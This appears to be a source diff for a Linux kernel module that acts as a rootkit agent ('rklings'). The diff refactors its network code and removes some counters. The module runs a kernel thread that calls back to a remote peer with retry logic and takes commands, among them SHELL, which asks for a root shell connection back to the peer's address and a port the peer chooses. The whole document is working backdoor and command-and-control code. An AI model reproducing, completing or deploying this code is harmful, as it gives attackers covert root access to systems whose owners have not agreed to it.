@@ -7,50 +7,10 @@
 #include <linux/random.h>
 #include <linux/socket.h>
 #include <linux/string.h>
-#include <linux/uio.h>
 #include <net/net_namespace.h>
 
 #include "agent.h"
 #include "root_shell.h"
-
-static ssize_t rk_socket_send(struct socket *socket,
-			      const unsigned char *bytes, size_t length,
-			      void *context)
-{
-	struct msghdr message = { };
-	struct kvec vector = {
-		.iov_base = (void *)bytes,
-		.iov_len = length,
-	};
-
-	(void)context;
-	return kernel_sendmsg(socket, &message, &vector, 1, length);
-}
-
-static ssize_t rk_socket_receive(struct socket *socket, unsigned char *bytes,
-				 size_t length, void *context)
-{
-	struct msghdr message = { };
-	struct kvec vector = {
-		.iov_base = bytes,
-		.iov_len = length,
-	};
-
-	(void)context;
-	return kernel_recvmsg(socket, &message, &vector, 1, length, 0);
-}
-
-static const struct rk_transport_ops rk_transport = {
-	.send = rk_socket_send,
-	.receive = rk_socket_receive,
-};
-
-static void rk_count_protocol_error(struct rk_agent *agent)
-{
-	mutex_lock(&agent->lock);
-	agent->protocol_errors++;
-	mutex_unlock(&agent->lock);
-}
 
 static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 			    const struct rk_frame *frame, bool *close_session)
@@ -58,43 +18,32 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 	static const unsigned char error_reply[] = "ERR";
 	static const unsigned char info_reply[] = "INFO rklings";
 	static const unsigned char pong_reply[] = "PONG";
-	static const unsigned char busy_reply[] = "ERR busy";
-	static const unsigned char shell_error_reply[] = "ERR shell";
 	unsigned char reply[RK_FRAME_MAX];
 	struct rk_command command;
-	struct rk_root_shell_status shell_status;
-	struct rk_root_shell_ticket ticket;
 	size_t reply_length;
 	int error;
 
 	*close_session = false;
 	error = rk_command_parse(frame->payload, frame->length, &command);
-	mutex_lock(&agent->lock);
-	agent->commands++;
 	if (error)
-		agent->protocol_errors++;
-	mutex_unlock(&agent->lock);
-	if (error)
-		return rk_send_frame(&rk_transport, NULL, socket, error_reply,
+		return rk_send_frame(socket, error_reply,
 				     sizeof(error_reply) - 1);
 
 	switch (command.kind) {
 	case RK_COMMAND_PING:
-		return rk_send_frame(&rk_transport, NULL, socket, pong_reply,
+		return rk_send_frame(socket, pong_reply,
 				     sizeof(pong_reply) - 1);
 	case RK_COMMAND_INFO:
-		return rk_send_frame(&rk_transport, NULL, socket, info_reply,
+		return rk_send_frame(socket, info_reply,
 				     sizeof(info_reply) - 1);
 	case RK_COMMAND_STATUS:
-		mutex_lock(&agent->lock);
 		reply_length = scnprintf(reply, sizeof(reply),
-					 "STATUS connected=%s attempts=%llu",
-					 agent->connected ? "true" : "false",
-					 agent->connections);
-		mutex_unlock(&agent->lock);
-		return rk_send_frame(&rk_transport, NULL, socket, reply,
-				     reply_length);
-	case RK_COMMAND_SHELL:
+					 "STATUS connected=%s",
+					 agent->connected ? "true" : "false");
+		return rk_send_frame(socket, reply, reply_length);
+	case RK_COMMAND_SHELL: {
+		struct rk_root_shell_ticket ticket;
+
 		error = rk_root_shell_request(
 			agent->shell, agent->peer.sin_addr.s_addr,
 			command.shell_port, &ticket);
@@ -103,25 +52,25 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 				reply, sizeof(reply), "OPEN %08x %016llx",
 				ticket.request_id,
 				(unsigned long long)ticket.cookie);
-			return rk_send_frame(&rk_transport, NULL, socket,
-					     reply, reply_length);
+			return rk_send_frame(socket, reply, reply_length);
 		}
 		if (error == -EBUSY)
-			return rk_send_frame(&rk_transport, NULL, socket,
-					     busy_reply,
-					     sizeof(busy_reply) - 1);
-		return rk_send_frame(&rk_transport, NULL, socket,
-				     shell_error_reply,
-				     sizeof(shell_error_reply) - 1);
-	case RK_COMMAND_SHELL_STATUS:
+			return rk_send_frame(socket,
+					     (const unsigned char *)"ERR busy", 8);
+		return rk_send_frame(socket,
+				     (const unsigned char *)"ERR shell", 9);
+	}
+	case RK_COMMAND_SHELL_STATUS: {
+		struct rk_root_shell_status shell_status;
+
 		rk_root_shell_snapshot(agent->shell, &shell_status);
 		reply_length = scnprintf(
 			reply, sizeof(reply), "STATE %08x %s %d",
 			shell_status.request_id,
 			rk_root_shell_state_name(shell_status.state),
 			shell_status.result);
-		return rk_send_frame(&rk_transport, NULL, socket, reply,
-				     reply_length);
+		return rk_send_frame(socket, reply, reply_length);
+	}
 	case RK_COMMAND_QUIT:
 		*close_session = true;
 		return 0;
@@ -140,13 +89,10 @@ static int rk_agent_serve(struct rk_agent *agent, struct socket *socket)
 
 		if (kthread_should_stop())
 			return 0;
-		error = rk_receive_frame(&rk_transport, NULL, socket, &frame);
+		error = rk_receive_frame(socket, &frame);
 		if (error == -EMSGSIZE) {
-			static const unsigned char reply[] = "ERR";
-
-			rk_count_protocol_error(agent);
-			error = rk_send_frame(&rk_transport, NULL, socket,
-					      reply, sizeof(reply) - 1);
+			error = rk_send_frame(socket,
+					      (const unsigned char *)"ERR", 3);
 			if (!error)
 				continue;
 		}
@@ -161,7 +107,6 @@ static int rk_agent_serve(struct rk_agent *agent, struct socket *socket)
 static int rk_agent_attempt(struct rk_agent *agent)
 {
 	struct socket *socket = NULL;
-	bool connected = false;
 	bool shutdown_here = false;
 	int error;
 
@@ -187,10 +132,8 @@ static int rk_agent_attempt(struct rk_agent *agent)
 			       sizeof(agent->peer), 0);
 	if (error)
 		goto close;
-	connected = true;
 	mutex_lock(&agent->lock);
 	agent->connected = true;
-	agent->connections++;
 	agent->retry_delay_ms = agent->retry_base_ms;
 	mutex_unlock(&agent->lock);
 	error = rk_agent_serve(agent, socket);
@@ -200,7 +143,7 @@ close:
 	if (agent->active == socket)
 		agent->active = NULL;
 	agent->connected = false;
-	if (connected && !agent->shutdown_started) {
+	if (!agent->shutdown_started) {
 		agent->shutdown_started = true;
 		shutdown_here = true;
 	}
@@ -216,21 +159,12 @@ static int rk_agent_worker(void *argument)
 	struct rk_agent *agent = argument;
 
 	while (!kthread_should_stop()) {
-		unsigned int delay;
-		long waited;
 		int error;
 
-		mutex_lock(&agent->lock);
-		agent->attempts++;
-		mutex_unlock(&agent->lock);
 		error = rk_agent_attempt(agent);
 		if (kthread_should_stop())
 			break;
 		mutex_lock(&agent->lock);
-		if (error)
-			agent->transport_errors++;
-		delay = agent->retry_delay_ms;
-		agent->retries++;
 		if (error)
 			agent->retry_delay_ms = rk_retry_next(
 				agent->retry_delay_ms, agent->retry_base_ms,
@@ -238,11 +172,14 @@ static int rk_agent_worker(void *argument)
 		else
 			agent->retry_delay_ms = agent->retry_base_ms;
 		mutex_unlock(&agent->lock);
-		delay += get_random_u32_below(delay / 4 + 1);
-		waited = wait_event_interruptible_timeout(
-			agent->retry_wait, kthread_should_stop(),
-			msecs_to_jiffies(delay));
-		(void)waited;
+		{
+			unsigned int delay = agent->retry_delay_ms;
+
+			delay += get_random_u32_below(delay / 4 + 1);
+			(void)wait_event_interruptible_timeout(
+				agent->retry_wait, kthread_should_stop(),
+				msecs_to_jiffies(delay));
+		}
 	}
 	return 0;
 }
